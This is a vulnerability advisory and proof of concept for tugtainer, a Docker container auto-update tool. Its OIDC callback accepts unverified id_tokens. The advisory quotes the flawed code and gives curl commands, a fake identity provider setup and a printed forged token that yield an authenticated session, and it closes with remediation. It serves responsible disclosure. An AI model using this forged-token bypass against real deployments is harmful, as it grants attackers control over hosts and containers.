# Summary

> **CVE status:** requested, pending assignment. This finding is published as
> [GHSA-crjc-6vc7-xrfh](https://github.com/Quenary/tugtainer/security/advisories/GHSA-crjc-6vc7-xrfh). On CVE assignment this repository is renamed
> `CVE-YYYY-NNNNN-tugtainer-PoC` and this banner is replaced with the CVE link.

| | |
|---|---|
| Researcher | Dostxodjayev Abdullox ([@squeeze440](https://github.com/squeeze440)) |
| Advisory | [GHSA-crjc-6vc7-xrfh](https://github.com/Quenary/tugtainer/security/advisories/GHSA-crjc-6vc7-xrfh) |
| CVSS 3.1 | 8.1 (High) |
| Weakness | CWE-347 |

---

## Summary

Improper verification of cryptographic signature in the OIDC authentication provider in `backend/modules/auth/providers/auth_oidc_provider.py` in Quenary/tugtainer (commit `3138226`) allows an attacker positioned to control or intercept the token-exchange response between the tugtainer backend and the configured OIDC provider (e.g. a network MITM position, a compromised/malicious identity provider, or a DNS/TLS-termination compromise on that path) to forge an arbitrary `id_token` and obtain a fully authenticated, admin-equivalent tugtainer session for any identity, via `GET /api/auth/oidc/callback`.

## Product

Quenary/tugtainer — self-hosted Docker container auto-update tool with web UI, agent/backend architecture.

## Tested Version

Commit `31382268bf16df32f33316fe4d601ad1635871d4` (repo default branch, cloned 2026-08-05).

## Estimated CVSS v3.1

**8.1 (High)** — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`

- `AC:H` (not `AC:L`): exploitation is not a plain unauthenticated network request. It requires the attacker to control what the *token endpoint* returns to the backend during the server-to-server code exchange — realistically a MITM position between the tugtainer backend and the real IdP, or a compromised/malicious IdP the backend is configured to trust. This is a genuine, non-trivial precondition, so `AC:H` is used rather than `AC:L`.
- `UI:N`: once the attacker has that network position, no victim interaction is needed — the attacker can drive the entire login flow themselves (confirmed in the PoC below, done end-to-end with `curl`).
- `C:H/I:H/A:H`: the resulting session is a full, unrestricted tugtainer session (no RBAC/allowlist exists for OIDC identities — see Details) with access to every container/host management endpoint: list/read all Docker hosts and containers, start/stop/kill/remove containers, pull images, and (if `ALLOW_HOOKS`/`ALLOW_EXEC` are enabled on a host) run commands inside containers.
- `S:U`: impact stays within tugtainer's own authorization boundary (the attacker becomes an authenticated tugtainer user); it is not treated as a scope change into a separately-authorized component.

## Details

`backend/modules/auth/providers/auth_oidc_provider.py`, method `_exchange_oidc_code` (lines 267–331), specifically lines 299–306:

```python
# Verify and decode ID token if present
if "id_token" in token:
    # For now, we'll decode without verification (not recommended for production)
    id_token_claims = jwt.get_unverified_claims(token["id_token"])
    return {
        "access_token": token.get("access_token"),
        "id_token_claims": id_token_claims,
    }
```

`jwt.get_unverified_claims()` (python-jose) base64-decodes the JWT payload **without checking the signature, `exp`/`iat`, or `aud`/`iss`** — the exact opposite of what OpenID Connect Core 1.0 §3.1.3.7 requires an RP to do before trusting an ID Token. The developer's own comment ("not recommended for production") confirms this was a known shortcut, not an intentional design choice.

The resulting claims flow straight into session creation with zero additional checks:

- `callback()` (line 137) calls `_exchange_oidc_code()` then `_create_oidc_user_session()` (line 333), which pulls `email`/`sub`/`preferred_username` (lines 341–345) directly out of the unverified claims and mints real, signed tugtainer `access_token`/`refresh_token` JWT cookies (`HttpOnly`, `SameSite=strict`) via `_set_cookies()`.
- There is no allowlist of permitted OIDC identities anywhere in the codebase (`grep` for allowlist/allowed-email patterns in `backend/` returns nothing) — whichever `sub`/`email` is in the (unverified) claims becomes the new session's identity, with the same access as any other logged-in user (tugtainer has a single flat trust level, no per-user RBAC).
- Because `aud` and `iss` are never checked, an ID Token issued for a completely unrelated client of the same IdP — or, as demonstrated below, one with a garbage/mismatched signature and an already-expired `exp` — is accepted just as readily as a legitimate one.

This is only reachable when `OIDC_ENABLED=true` (an admin opt-in), so it does not affect the default/password-only deployment.

## Proof of Concept

Verified dynamically against the real application built from this commit (`docker build -f Dockerfile.app`), run via plain `docker run` (not the published image) with:
```
OIDC_ENABLED=true
OIDC_WELL_KNOWN_URL=http://<attacker-controlled-idp>:9999/.well-known/openid-configuration
OIDC_CLIENT_ID=tugtainer-test-client
OIDC_CLIENT_SECRET=whatever-not-checked-by-fake-idp
OIDC_REDIRECT_URI=http://localhost:19412/api/auth/oidc/callback
```

A minimal fake OIDC provider (`evidence/fake_idp.py`, kept in this engagement folder) serves a valid discovery document, and on `POST /token` always returns an `id_token` that is deliberately invalid in every way an RP is supposed to check:
- signature = literal placeholder bytes, not a real HMAC/RSA signature
- `aud` = `"totally-wrong-client-id-not-tugtainers"` (does not match `OIDC_CLIENT_ID`)
- `exp` = 1 hour in the past (already expired)

Steps (real commands, real output, both containers run locally):

```
$ curl -s -i -c cookies.txt "http://localhost:19412/api/auth/oidc/login"
HTTP/1.1 302 Found
location: http://tugtainer-audit-idp:9999/authorize?client_id=tugtainer-test-client&...&state=NOPiwYzObzUwUkh119mw7YbzqmWEyZmzjEKmjaATpJQ
set-cookie: oidc_state=NOPiwYzObzUwUkh119mw7YbzqmWEyZmzjEKmjaATpJQ; HttpOnly; Max-Age=300; Path=/; SameSite=lax

$ curl -s -i -b cookies.txt -c cookies.txt \
  "http://localhost:19412/api/auth/oidc/callback?code=totally-arbitrary-unused-code&state=NOPiwYzObzUwUkh119mw7YbzqmWEyZmzjEKmjaATpJQ"
HTTP/1.1 302 Found
location: /containers
set-cookie: access_token=eyJhbGciOiJIUzI1NiIs...; HttpOnly; Max-Age=300; Path=/; SameSite=strict
set-cookie: refresh_token=eyJhbGciOiJIUzI1NiIs...; HttpOnly; Max-Age=2592000; Path=/; SameSite=strict
```

Decoded `access_token` payload (as minted by tugtainer's own JWT signer for this "user"):
```json
{"type":"access","auth_provider":"oidc","user_id":"attacker@evil.example",
 "user_info":{"iss":"http://tugtainer-audit-idp:9999","sub":"attacker@evil.example",
 "email":"attacker@evil.example","aud":"totally-wrong-client-id-not-tugtainers",
 "exp":1785918530,"iat":1785914930},"exp":1785922430}
```

Session then confirmed live against protected endpoints:

```
$ curl -s -i -b cookies.txt "http://localhost:19412/api/auth/is_authorized"
HTTP/1.1 200 OK

$ curl -s -b cookies.txt "http://localhost:19412/api/hosts/list"
[{"name":"local","enabled":true,...,"url":"http://127.0.0.1:8001","secret":null,...,"id":1,"available_updates_count":0}]

$ curl -s -i "http://localhost:19412/api/hosts/list"   # no cookies, for comparison
HTTP/1.1 401 Unauthorized
```

The fake IdP's own log confirms the exact forged token it handed back:
```
[fake-idp] issuing FORGED id_token (bad sig, wrong aud, expired):
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJpc3MiOiAiaHR0cDovL3R1Z3RhaW5lci1hdWRpdC1pZHA6OTk5OSIsICJzdWIiOiAiYXR0YWNrZXJAZXZpbC5leGFtcGxlIiwgImVtYWlsIjogImF0dGFja2VyQGV2aWwuZXhhbXBsZSIsICJhdWQiOiAidG90YWxseS13cm9uZy1jbGllbnQtaWQtbm90LXR1Z3RhaW5lcnMiLCAiZXhwIjogMTc4NTkxODUzMCwgImlhdCI6IDE3ODU5MTQ5MzB9.VEhJU19JU19OT1RfQV9WQUxJRF9TSUdOQVRVUkVfSlVTVF9SQU5ET01fQllURVNfMDAwMDAw
```

PoC helper: `evidence/fake_idp.py` (kept alongside this report).

No screenshots are included — this is a server-to-server API bypass with no browser/UI component to capture; the `curl` transcript above is the real, unmodified command/response evidence.

## Impact

Any attacker able to influence the response of the OIDC token-exchange call the tugtainer backend makes (MITM on that network path, a malicious/compromised IdP, or a DNS/TLS-termination compromise between backend and IdP) can mint a fully valid, unrestricted tugtainer session as an arbitrary identity — with no need to know any real user's credentials and no interaction from a legitimate user. Since tugtainer has no per-user RBAC, that session has full application access: enumerate all registered Docker hosts and containers, start/stop/kill/remove containers, pull/tag images, and (where `ALLOW_HOOKS`/agent `ALLOW_EXEC` are enabled) execute commands inside containers.

## Weaknesses

- CWE-347: Improper Verification of Cryptographic Signature
- CWE-345: Insufficient Verification of Data Authenticity (missing `aud`/`iss`/`exp` checks)
- CWE-287: Improper Authentication

## Remediation

In `_exchange_oidc_code`, replace `jwt.get_unverified_claims(token["id_token"])` with a verifying decode: fetch the IdP's `jwks_uri` from the discovery document, resolve the signing key by `kid`, and call `jwt.decode(id_token, key=jwk, algorithms=[...], audience=Config.OIDC_CLIENT_ID, issuer=discovery_doc["issuer"])` (python-jose supports all of this). This enforces signature, `exp`/`iat`/`nbf`, `aud`, and `iss` per the OIDC Core spec. Consider also adding an optional allowlist of accepted `email`/`sub` values for deployments that share an IdP with other applications.

## Credit

Dostxodjayev Abdullox (GitHub: squeeze440)

## Reporting Channel

GitHub Security Advisory / Private Vulnerability Reporting on `Quenary/tugtainer` (PVR confirmed enabled).
